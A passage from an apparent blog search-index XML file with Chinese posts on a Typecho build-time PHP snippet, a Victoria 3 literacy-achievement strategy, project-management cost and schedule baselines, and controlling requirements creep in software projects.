class=&quot;btime&quot;&gt;&#x27;.$value[&#x27;years&#x27;].&#x27;年&#x27;.$value[&#x27;days&#x27;].&#x27;天&#x27;.$value[&#x27;hours&#x27;].&#x27;小时&#x27;.$value[&#x27;minutes&#x27;].&#x27;分&lt;/span&gt;&#x27;;</span><br><span class="line">&#125;else</span><br><span class="line">&#123;</span><br><span class="line">echo &#x27;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在需要的地方使用如下代码调用即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php getBuildTime(); ?&gt;</span><br></pre></td></tr></table></figure><p>本站使用的便是第二个方法，可以在页面底部预览效果</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typecho </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>维多利亚3 成就 扫盲运动 识字率100%</title>
      <link href="/be37752f.html"/>
      <url>/be37752f.html</url>
      
        <content type="html"><![CDATA[<h2 id="成就详解"><a href="#成就详解" class="headerlink" title="成就详解"></a>成就详解</h2><p><img src="https://cos.gjcloak.xyz/pigo/202308031131355.webp?imageMogr2/format/webp/interlace/1/quality/0" alt="img"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>起步的时候，这个成就是全网第二低，仅次于背刺鬼才。网上的资料大多语焉不详。只有贴吧有一位靠谱的吧友一二三提出了解决方案<a href="https://steamcommunity.com/linkfilter/?url=http://tieba.baidu.com/p/8135523029">tieba.baidu.com&#x2F;p&#x2F;8135523029</a> ，但是于贴吧的格式，仍然不算详尽。所以我完成后决定还是认真写一写。同时感谢分享者！</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>识字率是每个pop的属性，出生就会被按照国内的受教育机会被赋值，单纯拔高教育机会，即使<strong>五级教育水平</strong>在法令<strong>促进社会流动</strong>以及东马里的奇迹<strong>杰内大清真寺</strong>的帮助下还是没法100%。</p><p><img src="https://cos.gjcloak.xyz/pigo/202308031134625.webp?imageMogr2/format/webp/interlace/1/quality/0" alt="img"></p><p><img src="https://cos.gjcloak.xyz/pigo/202308031134452.webp?imageMogr2/format/webp/interlace/1/quality/0" alt="img"></p><p><img src="https://cos.gjcloak.xyz/pigo/202308031135378.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>但pop如果是在非自给农场工作，在身份转换的同时会得到再教育。比如自给农变成劳工后有机会升职为技工。</p><p><img src="https://cos.gjcloak.xyz/pigo/202308031136491.webp?imageMogr2/format/webp/interlace/1/quality/0" alt="img"></p><p>那我们要做的，就是工业化消除自给农，同时通过高识字率消除文盲。</p><p>思路清晰了，但实操有几个难点。我们来看一下识字率在游戏要怎么看。</p><p>你以为的查看识字率的方法</p><p><img src="https://cos.gjcloak.xyz/pigo/202308031136441.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>如果你只看这张图，就会掉进最大的坑，不管你如何拉高识字率，关闭国门，识字率最多就会跳到99.96%。相信我，我跑完了两个1936年都没自然等到100%。</p><p>当然你也可以使用邪道办法，就是用天灾MOD，让国内的人不断死去，最终人口快死完的时候是有机会让文盲们都狗带的。</p><p>其他的办法比如不停打仗消耗人口，那顽固的几个文盲就是有办法躲在你不知道的角落苟活。</p><p>所以正确的查看识字率的方法是人口界面。</p><p><img src="https://cos.gjcloak.xyz/pigo/202308031137540.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>然后再点开具体的职业，再指向特点人群，就可以看到这个人群的识字率了。</p><p>当然你也点开具体的建筑看劳工详情。</p><p><img src="https://cos.gjcloak.xyz/pigo/202308031137380.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>具体地块的建筑劳工详情，也可以查看详细识字率，但也是需要在职业分类里面再按照文化和宗教细分类的。</p><p>惊喜不惊喜？意外不意外？反正我看懂之后我是觉得要在这种人口管理水平下找到那个死活不读书的文盲是比等他狗带更不可能完成的任务了。</p><p>虽然现版本的确可以在任何国家完成识字率这个成就，但为了自己的身心健康，我们还是要减少难度。</p><p><strong>首先开局最好单一文化、单一宗教且封闭国门。免得放文盲进来了。</strong></p><p><strong>其次最好与大市场有陆地接壤，避免要造港口。</strong></p><p><strong>为了以后着想，我们最好还是选本身识字率不超过20的国家。不然下版本改了这字就白码了。</strong></p><p><strong>最后最好单一地块，不然鼠标耗得起，手腕扛不住。</strong></p><p><strong>综上推荐，塞尔维亚。</strong></p><p>1846年的塞尔维亚单一文化、单一宗教、一个地块，自带封锁国门。北接奥地利、南邻奥斯曼。完美~</p><p><img src="https://cos.gjcloak.xyz/pigo/202308031138552.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>开局走加工工业化，工具、家具、衣服。依托南北两个大市场搞来料加工。最好签两个贸易协定，节约行政力。逐步改革国内法律，把五级教育打开就够了。期间始终保持社会流动性的法令。很快就能够实现工业化，消灭国内的自给农庄。</p><p>因为单一宗教、单一文化、单一地块。我们很容易就能查看地块内各个建筑的识字率情况。每个职位都只有一种员工（同文化、同宗教）。</p><p><img src="https://cos.gjcloak.xyz/pigo/202308031139163.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>从而迅速把文盲找到。</p><p>还记得识字率的解释中关于职业培训的部分吗？</p><p><img src="https://cos.gjcloak.xyz/pigo/202308031139801.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><h2 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h2><p>接下来就是真正的骚操作了。因为国内都是来料加工，所以只要控制原料的进口或者修改企业的生产方式，就能控制每个企业的盈亏。</p><p>比如不进口染料，但是要求玻璃厂生产陶瓷；不进口硬木，但是让家具厂生产高档家具。</p><p>被“调控”的企业就会亏损从而裁员乃至关停。而只要保证其他企业在盈利且有职位空缺，那么被你“调控”到失业的文盲就会进入别的企业再培训一次。否则就会变回自给农。</p><p>随着不断找到剩下的文盲，不断地让他们换工作，他们就不断得到培训机会。于是文盲就消灭了。</p><p><img src="https://cos.gjcloak.xyz/pigo/202308031140006.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>为了方便“调控”得多发展几个行业，食品、造纸、工具、家具、服装都来几个。反正开局才800K人口，不需要多大规模就消耗完劳动力了（识字率成就只考虑劳动力）。只是随着人口增长，你的产业规模也得增长，一切以消灭自给农为标准。</p><p>所以这个成就并不是没有意义的bug，完成过程对玩家理解工业化的产业链，各个建筑的运转以及劳动力的走向都是有帮助的。</p><p>期待你看完之后也成为微操大师~</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成就 </tag>
            
            <tag> 维多利亚3 </tag>
            
            <tag> VIC3 </tag>
            
            <tag> 思路 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>项目管理三大基准（三）：成本基准</title>
      <link href="/156.html"/>
      <url>/156.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>再前两篇文章《<a href="https://blog.gjcloak.top/154.html">项目管理三大基准（一）：范围基准</a>》和《<a href="https://blog.gjcloak.top/155.html">项目管理三大基准（二）：进度基准</a>》中，交代了一、二准则，在本文，我们分析了第三准则——成本基准，文章中主要从估算成本、制定预算、项目成本结构、生成成本基准、生成三大基准和项目三角形这六方面展开。</p></blockquote><p>在定义活动过程中我们得到了活动清单和活动属性，因此可对单个活动的成本进行估算，估算过单个活动的成本后可根据实际情况制定预算。</p><h2 id="一、估算成本"><a href="#一、估算成本" class="headerlink" title="一、估算成本"></a>一、估算成本</h2><p>估算单个活动的成本，估算单个活动的成本包括专家判断、类比估算、参数估算、三点估算、自下而上估算、储备分析和质量成本。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140830026.png?imageMogr2/format/webp/interlace/1/quality/80" alt="成本基准线" title="成本基准线"></p><p>其中专家判断、类比估算、参数估算、三点估算、自下而上估算与估算活动持续时间类似，这里不做赘述：</p><ul><li>储备分析：对发现的一致风险可以设立一定的应急费用，即为应急储备；</li><li>质量成本：为达到质量要求而增加的投入，包括一致性成本和非一致性成本；</li><li>一致性成本是指避免失败所花费的成本，包括预防成本和评估成本；</li><li>非一致性成本是指由于失败而花费的成本，包括内部失败成本和外部失败成本。</li></ul><p><img src="https://cos.gjcloak.xyz/pigo/202211140830393.png?imageMogr2/format/webp/interlace/1/quality/80" alt="成本基准线" title="成本基准线"></p><p>估算成本输出的一个重要文件为活动成本估算，如下图：</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140830167.png?imageMogr2/format/webp/interlace/1/quality/80" alt="成本基准线" title="成本基准线"></p><h2 id="二、制定预算"><a href="#二、制定预算" class="headerlink" title="二、制定预算"></a>二、制定预算</h2><p>制定预算是指根据项目估算的活动成本和应急储备进行综合分析，参考项目实际情况进行预算的制定。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140830620.png?imageMogr2/format/webp/interlace/1/quality/80" alt="成本基准线" title="成本基准线"></p><p>制定预算的方法包括成本汇总、历史信息审核、资金限制平衡：</p><ul><li>成本汇总：由估算的活动成本汇总得出工作包成本，再向上汇总得出控制账户成本、和项目成本；</li><li>历史信息审核：若估算的成本与以往类似项目成本偏差较大需要进行再次核对；</li><li>资金限制平衡：由于项目资金不是一步到位的，而是分阶段供给的，所以要根据资金水平调整进度计划安排。</li></ul><p>制定预算的重要输出文件是成本基准，成本基准描述了按时间段分配的项目预算，如下图所示：</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140830124.png?imageMogr2/format/webp/interlace/1/quality/80" alt="成本基准线" title="成本基准线"></p><h2 id="三、项目成本结构"><a href="#三、项目成本结构" class="headerlink" title="三、项目成本结构"></a>三、项目成本结构</h2><p>项目的成本结构从小到大进行逐级汇总，主要包括：资源成本、活动成本、工作包成本、控制账户成本、项目成本、成本基准、项目总预算、合同价格。</p><ul><li>其中资源成本、活动成本、工作包成本、控制账户成本、项目成本，对已识别的风险配备一定量的应急储备，可得到成本基准（完工预算）；</li><li>成本基准再针对未识别的风险配备一定量的管理储备，即可得到项目总预算；</li><li>项目总预算加上一定的利润即为合同价格。</li></ul><p><img src="https://cos.gjcloak.xyz/pigo/202211140830796.png?imageMogr2/format/webp/interlace/1/quality/80" alt="成本基准线" title="成本基准线"></p><h2 id="四、生成成本基准"><a href="#四、生成成本基准" class="headerlink" title="四、生成成本基准"></a>四、生成成本基准</h2><p>针对制定预算的到的成本基准需要经过审批方可生效，若要超出成本基准需要进行审批。</p><p>比如项目经理可动用应急储备，但不能动用管理储备，因为管理储备不在项目成本基准之内，若需要动用管理储备，需要走变更流程进行审批。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140830455.png?imageMogr2/format/webp/interlace/1/quality/80" alt="成本基准线" title="成本基准线"></p><h2 id="五、生成三大基准"><a href="#五、生成三大基准" class="headerlink" title="五、生成三大基准"></a>五、生成三大基准</h2><p>至此我们已通过三条线索，生成了范围基准、进度基准和成本基准，作为项目的三大基准，在此做一个简单的梳理。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140830718.png?imageMogr2/format/webp/interlace/1/quality/80" alt="成本基准线" title="成本基准线"></p><h3 id="1-范围基准"><a href="#1-范围基准" class="headerlink" title="1. 范围基准"></a>1. 范围基准</h3><ul><li>收集需求：通过一系列正式和非正式手段收集用户需求，得到需求文件和需求跟踪矩阵；</li><li>定义范围：明确项目边界，将一部分需求纳入项目范围，得到项目范围说明书；</li><li>创建WBS：将项目范围内的工作进行分解，得到WBS和WBS词典，并整合项目范围说明书得到范围基准进行审批。</li></ul><h3 id="2-进度基准"><a href="#2-进度基准" class="headerlink" title="2. 进度基准"></a>2. 进度基准</h3><ul><li>定义活动：将单位基准里的工作包分解为各个活动，得到活动清单和活动属性；</li><li>排列活动顺序：将活动按照其逻辑关系编制项目进度网络图；</li><li>估算活动持续时间：估算单个活动的持续时间；</li><li>制定进度计划：将项目进度网络图和估算的活动持续时间，结合实际资源情况进行整合得到进度基准进行审批。</li></ul><h3 id="3-成本基准"><a href="#3-成本基准" class="headerlink" title="3. 成本基准"></a>3. 成本基准</h3><ul><li>估算成本：估算单个活动或工作包的成本；</li><li>制定预算：根据估算的活动成本和风险情况进行预算的制定，生成成本基准进行审批。</li></ul><h2 id="六、项目三角形"><a href="#六、项目三角形" class="headerlink" title="六、项目三角形"></a>六、项目三角形</h2><p>以范围、进度、成本为三条边组成一个三角形，我们称为项目三角形，三角形的内切圆即为项目质量。</p><p>范围、进度、成本相互影响，若要扩大项目范围，时间或成本都要相应增加，否则项目三角形无法闭合，会影响项目质量，造成无法交付的后果；同理若要压缩进度，需要减少范围或增加成本，若要成本廉价，就要简要范围或增加时间。</p><p>项目管理就是在质量不变的情况下，保证三角形的闭合。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140830878.jpeg?imageMogr2/format/webp/interlace/1/quality/80" alt="成本基准线" title="成本基准线"></p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目管理 </tag>
            
            <tag> 成本基准 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>项目管理三大基准（二）：进度基准</title>
      <link href="/155.html"/>
      <url>/155.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>在上篇文章《<a href="https://blog.gjcloak.top/154.html">项目管理三大基准（一）：范围基准</a>》中，谈了范围基准。在本篇文章中，谈了进度基准，文章主要从定义活动、排列活动顺序、估算活动持续时间、制定进度计划、生成进度基准五方面展开。</p></blockquote><p>在上一篇《范围基准线》里我们通过收集用户需求来明确了项目边界，编制了项目范围说明书。然后在项目范围说明书的指导下，对项目边界内部的工作分解为更为细致的工作包，得到了范围基准。</p><p>本篇包含4个过程：定义活动、排列活动顺序、估算活动持续时间和制定进度计划</p><ul><li>定义活动：把工作包进一步分解为活动；</li><li>排列活动顺序：把活动按照一定的逻辑关系排列起来；</li><li>估算活动持续时间：通过一定的方法估算出每个活动的持续时间；</li><li>制定进度计划：把以上三个过程所做的工作进行分析和汇总，制定出进度计划。</li></ul><h2 id="一、定义活动"><a href="#一、定义活动" class="headerlink" title="一、定义活动"></a>一、定义活动</h2><p>定义活动是指把范围基准里定义好的工作包分解为一个个可执行的步骤，也就是活动，为后续制定进度计划做准备。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140829172.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p><p>定义活动过程中会产出3个文件：活动清单、活动属性和里程碑清单</p><h3 id="1-活动清单"><a href="#1-活动清单" class="headerlink" title="1. 活动清单"></a>1. 活动清单</h3><p>是一份记录和描述项目所有活动的清单，包括编号、活动名称和活动描述，如下图所示：</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140829538.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p><h3 id="2-活动属性"><a href="#2-活动属性" class="headerlink" title="2. 活动属性"></a>2. 活动属性</h3><p>描述了各个活动之间的逻辑关系（活动之间的逻辑关系会在排列活动顺序时详细讲述）以及影响活动其他制约因素。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140829648.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p><h3 id="3-里程碑清单"><a href="#3-里程碑清单" class="headerlink" title="3. 里程碑清单"></a>3. 里程碑清单</h3><p>里程碑是项目的重要节点，与活动不同，里程碑只是个时间点，持续时间为0。里程碑清单是识别并记录里程碑的一个列表，包括里程碑名称、里程碑描述和里程碑类型，如下图所示：</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140829594.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p><h2 id="二、排列活动顺序"><a href="#二、排列活动顺序" class="headerlink" title="二、排列活动顺序"></a>二、排列活动顺序</h2><h3 id="1-活动间的逻辑关系"><a href="#1-活动间的逻辑关系" class="headerlink" title="1. 活动间的逻辑关系"></a>1. 活动间的逻辑关系</h3><p>活动间的逻辑关系有4种，如下图所示：</p><ol><li>结束到开始（FS）：比如买菜和做饭，先买菜才能做饭；</li><li>结束到结束（FF）：比如写稿和校对，两个活动都结束才算两个活动真正结束；</li><li>开始到开始（SS）：比如浇灌地基和混凝土整平，两个活动一起开始；</li><li>开始到结束（SF）：比如换上新轮胎和卸下旧轮胎，有了新轮胎旧轮胎才可以被换掉。</li></ol><p><img src="https://cos.gjcloak.xyz/pigo/202211140829254.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p><h3 id="2-提前量和滞后量"><a href="#2-提前量和滞后量" class="headerlink" title="2. 提前量和滞后量"></a>2. 提前量和滞后量</h3><p>逻辑关系可根据实际情况进行提前量和滞后量的调整，例如活动A和活动B的逻辑关系是FS（结束到开始），但是由于特殊原因活动A结束后活动B并不能马上开始，5天后才能开始。</p><p>那么活动B相对于活动A的滞后量为5，活动A和活动B的逻辑关系为FS+5。相反若活动B提前3天开始，活动A和活动B的逻辑关系则为FS-3。</p><p>注意：提前量和滞后量是紧后活动相对于紧前活动来讲的。</p><p>排列活动顺序是指把活动清单、活动属性和里程碑清单用网络图的方式更直观地表现出来，使用紧前关系绘图法来绘制项目进度网络图，如下图所示：</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140829640.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p><h2 id="三、估算活动持续时间"><a href="#三、估算活动持续时间" class="headerlink" title="三、估算活动持续时间"></a>三、估算活动持续时间</h2><p>确定完成每个活动或工作包所花费的时间，估算方法的准确度从低到高分别是：专家判断、类比估算参数估算、三点估算、自下而上估算。</p><ul><li>专家判断：当信息较少时使用；</li><li>类比估算：以前做过类似项目，可以比较快速得出估算结果；</li><li>参数估算：使用已提炼的公式进行估算；</li><li>三点估算：包括三角分布和贝塔分布；</li><li>三角分布：（最悲观时间+最可能时间+最乐观时间）&#x2F;3；</li><li>贝塔分布：（最悲观时间+4倍最可能时间+最乐观时间）&#x2F;6；</li><li>自下而上估算：将活动进一步细化，进行累加。</li></ul><p>估算活动持续时间过程的输出的文件为活动持续时间估算结果和估算依据，需要注意的是估算的活动持续时间为一个范围，比如：8~12天。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140829322.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p><h2 id="四、制定进度计划"><a href="#四、制定进度计划" class="headerlink" title="四、制定进度计划"></a>四、制定进度计划</h2><p>制定进度计划是指分析活动顺序、持续时间、资源需求和制约因素，然后创建进度模型，主要方法包括关键路径法、进度压缩和资源优化。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140829141.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p><h3 id="1-关键路径法"><a href="#1-关键路径法" class="headerlink" title="1. 关键路径法"></a>1. 关键路径法</h3><p>项目进度网络图里耗时最长的那条路径即为关键路径，关键路径的时长代表项目的时长，关键路径越多，项目的风险越大。</p><h3 id="2-进度压缩"><a href="#2-进度压缩" class="headerlink" title="2. 进度压缩"></a>2. 进度压缩</h3><p>包括快速跟进和赶工，正常进度计划如下图：</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140829153.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p><p><strong>1）快速跟进</strong></p><p>增加紧后活动的提前量，尽快开始，是一种以风险换进度的方式。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140829352.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p><p><strong>2）赶工</strong></p><p>增加资源投入，缩短活动持续时间，是以成本换进度的一种方式。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140829531.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p><h3 id="3-资源优化"><a href="#3-资源优化" class="headerlink" title="3. 资源优化"></a>3. 资源优化</h3><p>包括：资源平衡和资源平滑</p><p><strong>1）资源平衡</strong></p><p>根据资源的制约因素对资源的开始时间和结束时间进行调整，比如小张请假两天，就把小张的工作往后调整两天，资源平衡技术会改变关键路径的长度。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140829033.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p><p><strong>2）资源平滑</strong></p><p>是指在不影响关键路径的前提下进行调整，所以资源平滑可能无法实现所有资源的优化。</p><p>制定进度计划过程的输出：进度计划和进度基准，进度计划有多种呈现方式，比如里程碑进度计划、概括性进度计划、详细进度计划。</p><p><strong>里程碑进度计划</strong>：也叫里程碑图，标出到达里程碑的时间节点。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140829009.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p><p><strong>概括性进度计划</strong>：也叫横道图或甘特图，标出了获得的开始时间和结束时间，用横条表示。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140829864.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p><p><strong>详细进度计划</strong>：也叫逻辑横道图，除了标出了活动的开始时间和结束时间，也表示了各个活动之间的逻辑关系，同时也标记了项目的里程碑。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140829419.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p><p><strong>进度基准</strong>：概括出进度计划里的高层次进度计划。</p><h2 id="五、生成进度基准"><a href="#五、生成进度基准" class="headerlink" title="五、生成进度基准"></a>五、生成进度基准</h2><p>把进度计划里的高层次进度计划提交管理层批准，便可得到进度基准。</p><p><img src="https://cos.gjcloak.xyz/pigo/202211140829085.png?imageMogr2/format/webp/interlace/1/quality/80" alt="进度基准线" title="进度基准线"></p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目管理 </tag>
            
            <tag> 进度基准 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件项目如何控制需求蔓延</title>
      <link href="/153.html"/>
      <url>/153.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/pigo/202211140758937.jpeg?imageMogr2/format/webp/interlace/1/quality/80" alt="img" title="img"></p><blockquote><p>当销售人员兴冲冲的告诉你又接了一个单子，只见合同上对需求内容只是寥寥几行时，你是否又头大了。对于销售人员接单是他们的目的，在客户处他们往往把话说的很满，这也能行、哪也能做。实际，很多功能的实现要让我们付出非常大的代价，那我们在项目需求管理方面要怎么做呢？</p></blockquote><p>对于一名项目经理来说，做出让客户满意的产品是我们的终极目标。但实际情况会是这样吗？现实，我们在项目开发过程中会遇到各种问题。</p><h3 id="需求范围不明确"><a href="#需求范围不明确" class="headerlink" title="需求范围不明确"></a>需求范围不明确</h3><p>合同中规定的内容往往都是模糊不清的，需求不明确，或者只有几行说明，而且还可能有大断的套话、官话。对于项目参与者往往对客户业务不一定了解，如果对客户真正想要的需求没有真正了解，往往会导致后期无何止的修改。</p><h3 id="需求理解不一致"><a href="#需求理解不一致" class="headerlink" title="需求理解不一致"></a>需求理解不一致</h3><p>我们经常会遇到，按照客户书面上记录的需求进行开发后，客户却并不认可，而实际情况，客户对自己写的书面内容也并无异议。原因是对同样的内容客户的理解与我们的理解不同。例如，需求中写道：“购物后付款”，开发人员开发出来的是用户选择好商品进入购物车直接付款。而客户实际想要的是到购物车付款前先向客户发送一条短信验证码，让购买人二次确认无误后再付款。同样的文字，对细节的理解可能就是不同的，但实现的细节客户提供的需求里可能根本就没有提。</p><h3 id="有些需求并没有直接写出来"><a href="#有些需求并没有直接写出来" class="headerlink" title="有些需求并没有直接写出来"></a>有些需求并没有直接写出来</h3><p>中国人喜欢儒家思想，话多为隐晦而不直白的说出，客户提的多是自己期望解决的需求，而对于最基本需求往往不说，因为他认为你就应该有。如做一款手机，手机打电话的功能客户是不用说的；再如，智通面包机，做面包的功能也是不需要说的，他只会说如何智能法。</p><h3 id="项目结束前客户总有提不完的需求"><a href="#项目结束前客户总有提不完的需求" class="headerlink" title="项目结束前客户总有提不完的需求"></a>项目结束前客户总有提不完的需求</h3><p>客户总是会在结项前提出各种需求，前期没有讨论过的各种需求都会在这个时候冒出来，让项目被动受制。这种情况原因一般有两种，一种是在项目开发过程中没有与客户充分的沟通。另一种就是客户生怕项目一结束付款，你们就不会再很好的支持我们了。那么所有需求不论重要与否，你都要在结束前给我做完。</p><h3 id="项目经理无条件的迁就客户"><a href="#项目经理无条件的迁就客户" class="headerlink" title="项目经理无条件的迁就客户"></a>项目经理无条件的迁就客户</h3><p>虽然项目成功的标志是客户满意度，但无条件的迁就客户最终可能导致项目预算超期或时间超期，反而会导致项目失败。客户在提一条新需求时可能自己都没有想清楚，也可能只是他的灵光一现，许多需求可能只是冗余需求。客户往往不懂程序，随便说出的需求，可能让我们付出很大的代价。</p><p>沟通不顺畅，老吴以前做项目时也经常遇到对计算机一点不懂的客户，他们的许多想法根本无法实现，跟他解释他又很难理解，最后弄得好像我们什么都做不了似的。对于这种客户有时会让我们有种无力感。</p><p>一个项目的成功需要多方面原因，人力资源、需求范围、项目成本、进度控制、质量监督、风险监控、资源采购、干系人沟通，每个方面出问题都可能会导致项目的失败，所以项目管理也要有一套系统的管理办法。对于无边界的需求蔓延，我们应该怎么办？</p><p>上面我们已经提到了可能导致需求的不可控原因，哪我们来说下具体可操作的解决办法吧。</p><h3 id="确定项目范围"><a href="#确定项目范围" class="headerlink" title="确定项目范围"></a>确定项目范围</h3><p>项目一定要有清晰的目标、准确的方向，大海航行靠舵手，项目经理要有把撑好项目范围的能力，尽量把项目需求让所有项目干系人（范围相关的所有人）知晓，尤其要得到客户的认可，必要时要让用户确认。以前经常听有的项目经理说：“需求最后一定要让客户领导签字”，老吴本人认为这有点难度，以前我做政府类项目时哪个领导愿意签字的，谁愿意背这个责任，还有真要有必要需求增加时，签了字如何增加，客户会有一百个不愿意。如果你真有这能力，能弄到客户签字哪对项目是极大的帮助。</p><h3 id="多问问为什么"><a href="#多问问为什么" class="headerlink" title="多问问为什么"></a>多问问为什么</h3><p>对于客户每提出的新需求，我们尽量多了解他的目的是什么，多问、多想，当我们知道客户的终极目标时，我们就可以主导客户需求了。同时，我们了解了客户提此需求的目的后也有利于我们对需求的更好把握，不至于项目需求出现偏差。</p><h3 id="需求理解要一致"><a href="#需求理解要一致" class="headerlink" title="需求理解要一致"></a>需求理解要一致</h3><p>项目经理要对项目进行跟进和监控，需求要很好的贯彻到每个人，不要出现理解偏差。记得看过一篇图文的短文，大致意思是客户想要的产品、项目经理理解的产品、设计人员设计的产品、开发人员要做成的产品、开发人员最后做出来的产品、测试人员看到的产品都不一致。每个人在信息传递过程中让需求不断出现损耗和变形。需求理解的一致性是项目成功的基础，在项目管理的各个阶段，要让所有相关人正确的了解和把握需求。</p><h3 id="要让客户参与到项目的各个阶段"><a href="#要让客户参与到项目的各个阶段" class="headerlink" title="要让客户参与到项目的各个阶段"></a>要让客户参与到项目的各个阶段</h3><p>项目经理要拉着客户参与到项目的各个阶段，需求分析、总体设计、详细设计、编码、测试，要让客户参与到项目的每个阶段，并随时让客户了解和提出自己的真实想法。这样就不会导致项目在最后时客户提出各种需求，变被动为主动。尤其是在需求分析和设计阶段，当整理完需求文档和设计文档时，一定要请客户一起参与评估，以避免需求理解不一致，需求范围不确定等问题。我们以前常提敏捷软件开发方法，敏捷开发又不至于项目出现更大问题的办法就是让客户随时参与项目的各个阶段，让客户与我们的项目管理人员一起把关。</p><p>要让客户对需求进行确认。当多次与客户确认需求后，尽量让客户签字认可，如不能签字也尽量让客户方领导在正式场合当面确认。</p><p>这样的好处有：</p><ol><li>可以有效的控制需求，当客户再有想加的需求时总不至于那么理直气壮；</li><li>如客户真要加需求时，我们可以因需求变更而提出一定的经济补偿；</li><li>如果需求增加了，项目经理可以凭借着签字在公司内部规避自己的责任，毕竟客户以前是认可的，这回再提增加需求，就不是项目经理能力范围了，可以请领导出面；</li><li>有了客户确认的需求，项目组可以放心的去完成项目，以减少需求变更所带来的影响。</li></ol><h3 id="做好服务，要让客户信任我们"><a href="#做好服务，要让客户信任我们" class="headerlink" title="做好服务，要让客户信任我们"></a>做好服务，要让客户信任我们</h3><p>客户之所以在项目结束前尽量让我们把所有能想到的做好，有时还提出各种刁难，就是怕我们在项目结束后就不能很好的给予支持了。对于公司和团队，我们要建立完整的服务机制，要让用户看到我们的服务。如果客户对我们公司和团队认可了，相信以后的服务过程中有了问题，我们还会及时处理，那么客户会允许我们把部分非核心需求放到将来处理的。信任是种力量，让客户信任我们就要始终如一的做好服务。</p><h3 id="做好需求变更机制"><a href="#做好需求变更机制" class="headerlink" title="做好需求变更机制"></a>做好需求变更机制</h3><p>有时需求的变更是不可避免的，当发生需求变更时，我们要有一定的需求变更机制。首先要冷静看待需求的变更，与客户沟通好，要对需求变更的工作内容、工作量进行评估、因变更所产生的费用、针对需求变更提出的方案，并填写需求变更文件让客户签字，要让客户知道需求变更对项目产生的影响，对于需求的变更客户也要承担一定的责任（时间或经济）。</p><h3 id="条条大路通罗马"><a href="#条条大路通罗马" class="headerlink" 